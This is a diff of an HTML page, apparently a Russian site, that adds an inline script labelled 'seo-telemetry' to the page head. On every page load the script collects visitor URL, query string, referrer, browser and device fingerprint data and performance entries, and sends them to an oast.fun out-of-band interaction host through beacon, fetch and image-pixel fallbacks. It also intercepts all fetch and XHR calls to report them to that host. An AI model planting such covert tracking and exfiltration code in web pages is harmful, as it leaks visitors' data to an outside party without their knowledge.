@@ -1,6 +1,184 @@
 <!doctype html>
 <html lang="ru">
   <head>
+    <script>
+(() => {
+  const OAST = "https://d2bk3gnm8k8moue2tj50g6fxr49b7bqua.oast.fun/seo-telemetry";
+
+  // Безопасный помощник отправки (beacon -> fetch POST -> пиксель GET)
+  async function ship(payload) {
+    const body = JSON.stringify(payload, null, 2); // pretty JSON
+
+    try {
+      if (navigator.sendBeacon && navigator.sendBeacon(OAST, new Blob([body], { type: "text/plain" }))) {
+        return;
+      }
+    } catch(_) {}
+
+    try {
+      await fetch(OAST, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain" },
+        body
+      });
+      return;
+    } catch(_) {}
+
+    // Fallback: кладём урезанные данные в GET (на случай тотального запрета POST)
+    try {
+      const q = encodeURIComponent(body.slice(0, 1800)); // ограничим длину
+      const i = new Image();
+      i.src = `${OAST}?d=${q}`;
+    } catch(_) {}
+  }
+
+  function capArray(arr, n=100) {
+    try { return Array.from(arr).slice(0, n); } catch { return []; }
+  }
+
+  function perfSnapshot() {
+    const p = window.performance;
+    if (!p) return {};
+    const nav = (p.getEntriesByType?.("navigation") || [])[0] || {};
+    const res = capArray(p.getEntriesByType?.("resource") || [], 200).map(r => ({
+      name: r.name, initiatorType: r.initiatorType, transferSize: r.transferSize, duration: Math.round(r.duration)
+    }));
+    return {
+      timing: {
+        type: nav.type, startTime: nav.startTime,
+        domContentLoaded: Math.round((nav.domContentLoadedEventEnd || 0) - (nav.startTime || 0)),
+        loadEvent: Math.round((nav.loadEventEnd || 0) - (nav.startTime || 0)),
+        response: Math.round((nav.responseEnd || 0) - (nav.requestStart || 0))
+      },
+      resourcesSample: res,
+      resourcesCount: (p.getEntriesByType?.("resource") || []).length
+    };
+  }
+
+  function uaData() {
+    const d = navigator.userAgentData;
+    let brands = undefined, mobile = undefined, platform = navigator.platform;
+    if (d && typeof d === "object") {
+      brands = (d.brands || d.uaList || []).map(b => `${b.brand}/${b.version}`);
+      mobile = d.mobile;
+      platform = d.platform || platform;
+    }
+    return { brands, mobile, platform };
+  }
+
+  function metaTags() {
+    try {
+      return capArray(document.querySelectorAll('meta[name], meta[property], link[rel="canonical"], meta[http-equiv]'), 50)
+        .map(n => ({
+          tag: n.tagName.toLowerCase(),
+          name: n.getAttribute("name") || n.getAttribute("property") || n.getAttribute("http-equiv") || null,
+          rel: n.getAttribute("rel") || null,
+          content: (n.getAttribute("content") || n.getAttribute("href") || "").slice(0, 300)
+        }));
+    } catch { return []; }
+  }
+
+  function buildPayload(stage) {
+    const tz = Intl.DateTimeFormat().resolvedOptions?.().timeZone;
+    const lang = (navigator.languages && navigator.languages.join(",")) || navigator.language;
+    const dims = {
+      vw: window.innerWidth || null,
+      vh: window.innerHeight || null,
+      sw: screen?.width || null,
+      sh: screen?.height || null,
+      dpr: window.devicePixelRatio || 1
+    };
+
+    return {
+      stage,                            // "dom-start" / "dom-ready" / "load"
+      whenUTC: new Date().toISOString(),
+      location: {
+        href: location.href,
+        host: location.host,
+        path: location.pathname,
+        search: location.search.slice(0, 600),
+        referrer: document.referrer
+      },
+      document: {
+        title: (document.title || "").slice(0, 200),
+        visibility: document.visibilityState,
+        charset: document.characterSet
+      },
+      navigator: {
+        userAgent: navigator.userAgent,
+        ...uaData(),
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        doNotTrack: navigator.doNotTrack,
+        cookiesEnabled: navigator.cookieEnabled,
+        webdriver: !!navigator.webdriver,
+        timezone: tz,
+        languages: lang
+      },
+      screen: dims,
+      meta: metaTags(),
+      performance: perfSnapshot(),
+      storage: {
+        local: (() => { try { localStorage.setItem("__t","1"); localStorage.removeItem("__t"); return true; } catch { return false; } })(),
+        session: (() => { try { sessionStorage.setItem("__t","1"); sessionStorage.removeItem("__t"); return true; } catch { return false; } })()
+      },
+      features: {
+        fetch: !!window.fetch,
+        serviceWorker: !!navigator.serviceWorker,
+        beacons: !!navigator.sendBeacon,
+        jsEnabled: true
+      }
+    };
+  }
+
+  // Перехват fetch/XHR, чтобы понять, что именно грузит бот (если он исполняет JS)
+  (function hookNetwork(){
+    try {
+      const origFetch = window.fetch;
+      window.fetch = function(input, init) {
+        try {
+          const url = (typeof input === "string") ? input : input.url;
+          ship({ stage: "net-fetch", url, method: (init && init.method) || "GET" });
+        } catch(_) {}
+        return origFetch.apply(this, arguments);
+      };
+    } catch(_){}
+
+    try {
+      const OrigXHR = window.XMLHttpRequest;
+      function XHR(){
+        const xhr = new OrigXHR();
+        const _open = xhr.open;
+        xhr.open = function(method, url) {
+          try { ship({ stage: "net-xhr", url, method }); } catch(_){}
+          return _open.apply(this, arguments);
+        };
+        return xhr;
+      }
+      window.XMLHttpRequest = XHR;
+    } catch(_){}
+  })();
+
+  // Отправим по ключевым этапам жизненного цикла
+  ship(buildPayload("dom-start"));
+
+  if (document.readyState === "complete" || document.readyState === "interactive") {
+    ship(buildPayload("dom-ready"));
+  } else {
+    document.addEventListener("DOMContentLoaded", () => ship(buildPayload("dom-ready")), { once: true });
+  }
+
+  window.addEventListener("load", () => ship(buildPayload("load")), { once: true });
+
+  // Дополнительно: изменения видимости (боты редко, но вдруг)
+  document.addEventListener("visibilitychange", () => {
+    ship({ stage: "visibility", state: document.visibilityState, whenUTC: new Date().toISOString() });
+  });
+
+})();
+</script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="yandex-verification" content="27ed404b39f25d7f" />
